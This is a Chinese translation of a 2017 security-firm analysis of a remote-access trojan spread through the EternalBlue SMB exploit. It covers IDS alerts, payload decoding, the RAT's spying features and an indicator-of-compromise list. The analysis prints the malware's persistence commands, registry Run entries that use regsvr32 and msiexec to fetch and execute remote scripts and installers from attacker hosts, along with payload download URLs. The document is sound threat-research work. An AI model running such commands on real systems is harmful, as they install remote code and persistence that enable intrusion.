# 【木马分析】分析利用“永恒之蓝”漏洞传播的RAT

阅读量 **262556**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-09-12 14:27:29

 **x**

##### 译文声明

本文是翻译文章，文章来源：cyphort.com

原文地址：<https://www.cyphort.com/eternalblue-exploit-actively-used-deliver-remote-access-trojans/>

译文仅供参考，具体内容表达以及含义原文为准。

译者：[ **Carpediem**](http://bobao.360.cn/member/contribute?uid=2659563319)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

  

**前言**

在WannaCry病毒肆虐期间，Cyphort实验室已经发现了利用同样的“永恒之蓝”攻击包来传播恶意软件。这个恶意软件不是勒索软件也不是之前报道过的比特币挖矿软件。这是一个典型的远控木马，用来监视人们的行为或者控制他们的计算机操作任何攻击者想实现的目的。

5月12号，在WannaCry病毒传播期间，Cyphort实验室的研究员已经发现了一个针对我们蜜罐服务器的一个相似的SMB攻击。后来，又在5月3号我们发现了同一攻击行为的证据。

网络捕捉到的SMB攻击

有非常多的基于以下ET规则的“永恒之蓝”攻击

    
    
    05/12/2017-17:27:19.766291  [**] [1:2024217:2] ET EXPLOIT PossibleETERNALBLUE MS17-010 Heap Spray [**] [Classification: A Network Trojan was detected] [Priority: 1] {TCP} 182.18.23.38:55768 -> 192.168.160.60:445
    05/12/2017-17:27:20.225752  [**] [1:2024217:2] ET EXPLOIT PossibleETERNALBLUE MS17-010 Heap Spray [**] [Classification: A Network Trojan was detected] [Priority: 1] {TCP} 182.18.23.38:55768 -> 192.168.160.60:445
    05/12/2017-17:27:20.652098  [**] [1:2024218:1] ET EXPLOIT PossibleETERNALBLUE MS17-010 Echo Response [**] [Classification: A Network Trojan was detected] [Priority: 1] {TCP} 192.168.160.60:445 -> 182.18.23.38:55768
    05/12/2017-17:27:26.772666  [**] [1:2024218:1] ET EXPLOIT PossibleETERNALBLUE MS17-010 Echo Response [**] [Classification: A Network Trojan was detected] [Priority: 1] {TCP} 192.168.160.60:445 -> 182.18.23.38:55768

我们最初认为这是WannaCry，但是经过进一步调查我们发现这是一个极为隐秘的RAT。不像WannaCry，这种威胁只感染一次而不进行传播，它不是蠕虫。

  

**Payload**

从pcap文件中我们知道攻击者的IP是182.18.23.38.这是一个中国境内的地址。

一旦攻击成功，攻击者将发送一个加密的payload作为shellcode。这个shellcode 通过异或key“A9 CA 63
BA”加密，并且嵌入了二进制代码如下图所示：

嵌入式DLL的文件属性：

    
    
    MD5: B6B68FAA706F7740DAFD8941C4C5E35A
    SHA1: 806027DB01B4997F71AEFDE8A5DBEE5B8D9DBE98
    Time Stamp: Sat Apr 29 09:57:21 2017
    Debugging Symbols Path: d:down10releasedown10.pdb
    Exports: DllMain, test, InWMI

这个嵌入式DLL是木马母体，它会下载附加的恶意软件和接受来自控制者的指令。他接受以下形式的指令：

    
    
    [down]
    [cmd]

这些命令是从 “http://down[.]mysking.info:8888/ok.txt”下载的。

【down】命令指示恶意软件从一个链接下载并将它以第二个参数名保存。比如这个他将下载
“http://23.27.127.254:8888/close.bat”，并且保存为 c:windowsdebugc.bat。

【cmd】命令后面跟着一系列恶意软件将要执行的命令。

运行以上的命令，

将会删除以下的用户：

    
    
    Asps.xnet
    IISUSER_ACCOUNTXX
    IUSR_ADMIN 
    snt0454 
    Asp.net
    aspnet

将终止或者删除以下文件或进程。

    
    
    c:windowsLogo1_.exe
    c:windowsdellUpdate64.exe
    Misiai.exe
    c:windowsRichDllt.dll
    C:windowswinhost.exe
    C:windowsygwmgo.exe
    c:windowsnetcore.exe

将通过FTP从down.mysking.info下载了一个a.exe文件作为 “Mysa”工作文件。

它会设置到以下的启动项中，为了下载或是执行附加的恶意软件。

    
    
    reg add “HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun” /v “start” /d “regsvr32 /u /s /i:http://js.mykings.top:280/v.sct scrobj.dll” /f 
    reg add “HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun” /v “start1” /d “msiexec.exe /i http://js.mykings.top:280/helloworld.msi /q” /f

然后它会执行c.bat和另外一个DLL文件item.dat:

    
    
    rundll32.exe c:windowsdebugitem.dat,ServiceMain aaaa

除此之外它将通过访问http://wmi[.]mykings.top:8888/kill.html 获取要终止的进程清单。

  

**Payload的第二阶段: Item.dat**

我们不能从自己的服务器上捕捉到item.dat。
由于【cmd】命令的作用，这个文件被保存到C:Windowsdebugitem.dat。我们认为这是payload的第二阶段。我们调查了Virustotal上的其他文件，发现他的哈希：

    
    
    e6fc79a24d40aea81afdc7886a05f008385661a518422b22873d34496c3fb36b

Virustotal上发现的这个恶意软件从以下链接可以下载：

    
    
    http://67[.]229.144.218:8888/test1.dat
    http://47[.]88.216.68:8888/test.dat
    http://47[.]52.0.176:8888/item.dat
    http://118[.]190.50.141:8888/test.dat

这意味着攻击者用上述的IP作为控制端，并且根据Virustotal提供的情报，恶意软件似乎影响了多个地区。

样本第一次出现Virustotal是在2017年4月2号，从那以后 我们在Virustotal已经发现了12 个相似的样本

    
    
    0108036951155a66879491ffc499cdb1e451e9ade58d62521a49a07aa4c79b74
    25db9243e3fb0b18a8847c001b05c02b3cc686752a2e4ae28c4678d513b48e6f
    b899ba1e426b838dd75d541cfe48d08a49453fb901e2808a15bbb44e08983d68
    19fce399808befd7dfe92a0ab7cd006357f0d3a8a519a14953a3d217cca8ae48
    557b13d6562b780612d932a6c0513acd8316885357b70ba5a8aedbbaa83668a9
    56a35e6de83b7a6e9ecb731a5a636e91ab32899eb90fbec24c8f4d40467ca5d9
    ec7fd8909baaf79077368dd113294c43e7269b323473e8825e73f64e2f71d0af
    ceef5ea176716e225cc2389f0629b4d1ae3edb83c490c70f415c51a1b5118c19
    05104184573f666dbf000c8150fc17c186e98de2c33f4177a406d125af751388
    4d5cf13167537ce422ad0fe00f60ac523defde5ad0304a1d04eed77e9d590df0
    ed5e704c63d5ec60adba8b5b56147f5c92f236b5410aff7246e8dab89961a51b
    cf3cd50f7ce87d2a83ccda680a2bd82a45d62714432820cd0a5d7d784f08e147

这表明他们在2017.5.12号WannaCry爆发之前，已经通过“永恒之蓝”进行过攻击。

这个样本是通过 Safengine Shielden 壳来防护的。

item.dat的防护壳

这个样本是一个RAT，允许攻击者访问和控制受感染的机器

正在运行的item.dat的内存dump

基于以上的字符串，我们发现ForShare 8.28软件与其有相似之处，这个程序属于中国的网站。

<http://en.pudn.com/downloads758/sourcecode/windows/detail3014472_en.html>

<http://www.codeforge.cn/read/287854/MyClientTran.cpp__html>

在网站上发现的ForShare 8.28 GUI

基于源码我们确认这款恶意软件是 ForShare RAT其中的一个版本，这个RAT有以下许多“间谍”的特征：

接受并执行来自服务器的指令

监控屏幕

音视频监控

监控键盘

文件和数据传输

文件删除

终止进程

文件执行

枚举文件和进程

文件下载

控制机器

以下是RAT的一个命令片段

Close.bat

这个恶意软件一个有趣的行为是通过执行close.bat文件来关闭445端口。 Close.bat 或者 c.bat包含以下的代码:

这也是一个指标表明恶意软件是通过“永恒之蓝”传播的，并且关闭了445端口。因为攻击者不希望其他的攻击者影响他们的活动。我们相信这次攻击背后的团队跟在二月份发现
[spreads Mirai via Windows
Kaspersky](https://securelist.com/blog/research/77621/newish-mirai-spreader-poses-new-risks/)是同一个团队。我们发现了他们IOCs的相似之处。

  

**结论**

WannaCry勒索病毒以广泛的传播和巨大的破话性向这个世界传递一个强烈的信息。很明显这个信息就是：网络上有许多系统容易受到网络攻击。咋一看我们发现的这个威胁不像WannaCry勒索病毒破坏性大，但是危险大与否主要取决于攻击者的意图。主要的有效载荷是一个RAT，我们都清楚一旦恶意攻击者进入到你的企业内部会发生什么。并且如果WannaCry没有爆发，我们可能都不清楚网络上会有多少有漏洞的系统可以进行0day攻击，这也许是更危险的。最伤你心的是那些你看不见的东西。

特别感谢Joe Dela Cruz, Alex Burt, Abhijit Mohanta以及Cyphort
实验室的其他成员对于分析和发现此次威胁给与的帮助。

  

**IOC**

**Files**

    
    
    C:Windowsdebugc.bat
    C:Windowsdebugitem.dat

**SHA256**

    
    
    E6fc79a24d40aea81afdc7886a05f008385661a518422b22873d34496c3fb36b
    0108036951155a66879491ffc499cdb1e451e9ade58d62521a49a07aa4c79b74
    25db9243e3fb0b18a8847c001b05c02b3cc686752a2e4ae28c4678d513b48e6f
    b899ba1e426b838dd75d541cfe48d08a49453fb901e2808a15bbb44e08983d68
    19fce399808befd7dfe92a0ab7cd006357f0d3a8a519a14953a3d217cca8ae48
    557b13d6562b780612d932a6c0513acd8316885357b70ba5a8aedbbaa83668a9
    56a35e6de83b7a6e9ecb731a5a636e91ab32899eb90fbec24c8f4d40467ca5d9
    ec7fd8909baaf79077368dd113294c43e7269b323473e8825e73f64e2f71d0af
    ceef5ea176716e225cc2389f0629b4d1ae3edb83c490c70f415c51a1b5118c19
    05104184573f666dbf000c8150fc17c186e98de2c33f4177a406d125af751388
    4d5cf13167537ce422ad0fe00f60ac523defde5ad0304a1d04eed77e9d590df0
    ed5e704c63d5ec60adba8b5b56147f5c92f236b5410aff7246e8dab89961a51b
    cf3cd50f7ce87d2a83ccda680a2bd82a45d62714432820cd0a5d7d784f08e147

**IP, URLs, and Domains**

    
    
    182.18.23.38
    Js.mykings.top
    Down.mysking.info
    Wmi.mykings.top
    23.27.127.254
    118.190.50.141
    47.52.0.176
    47.88.216.68
    67.229.144.218
    http://67.229.144.218:8888/test1.dat
    http://47.88.216.68:8888/test.dat
    http://47.52.0.176:8888/item.dat
    http://118.190.50.141:8888/test.dat
    http://down.mysking.info:8888/ok.txt
    http://wmi.mykings.top:8888/kill.html
    http://23.27.127.254:8888/close.bat
    http://js.mykings.top:280/v.sct
    http://js.mykings.top:280/helloworld.msi
    scdc.worra.com

本文翻译自cyphort.com [原文链接](https://www.cyphort.com/eternalblue-exploit-actively-used-deliver-remote-access-trojans/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Carpediem** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/86822](/post/id/86822)

安全客 - 有思想的安全新媒体

本文转载自: [cyphort.com](https://www.cyphort.com/eternalblue-exploit-actively-used-deliver-remote-access-trojans/)

如若转载,请注明出处： <https://www.cyphort.com/eternalblue-exploit-actively-used-deliver-remote-access-trojans/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p2.ssl.qhmsg.com/dm/200_200_100/t0183051a464cd8430b.jpg) Carpediem

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

